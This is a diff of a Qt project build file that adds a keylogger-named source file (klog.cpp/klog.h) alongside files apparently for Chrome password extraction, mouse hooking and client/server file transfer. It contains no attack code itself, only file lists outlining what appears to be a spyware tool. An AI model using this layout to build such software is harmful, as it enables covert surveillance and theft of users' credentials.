@@ -26,7 +26,8 @@ SOURCES += \
         ../includes/fileclient.cpp \
         ../includes/fileserver.cpp \
         ../includes/mousehookWinApi.cpp \
-        ../includes/chromePass.cpp
+        ../includes/chromePass.cpp \
+    ../includes/klog.cpp
 
 
 HEADERS += \
@@ -36,7 +37,8 @@ HEADERS += \
         ../includes/fileserver.h \
         ../includes/mousehookWinApi.h \
         ../includes/chromePass.h \
-        ../includes/files.h
+        ../includes/files.h \
+    ../includes/klog.h
 
 # The following define makes your compiler emit warnings if you use
 # any feature of Qt which as been marked deprecated (the exact warnings
